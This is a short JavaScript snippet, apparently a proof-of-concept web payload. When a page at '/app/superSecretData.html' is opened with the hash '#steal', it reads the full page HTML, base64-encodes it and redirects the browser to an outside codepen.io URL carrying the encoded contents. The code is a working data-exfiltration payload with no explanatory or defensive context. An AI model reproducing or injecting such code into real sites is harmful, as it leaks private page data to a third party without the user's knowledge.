if (location.pathname === "/app/superSecretData.html" && location.hash === "#steal") {
  setTimeout(() => {
    const contents = document.documentElement.innerHTML;
    location.href = "https://codepen.io/rishaldwivedi/full/myJajjG#super=" + btoa(contents);
  }, 500);
}
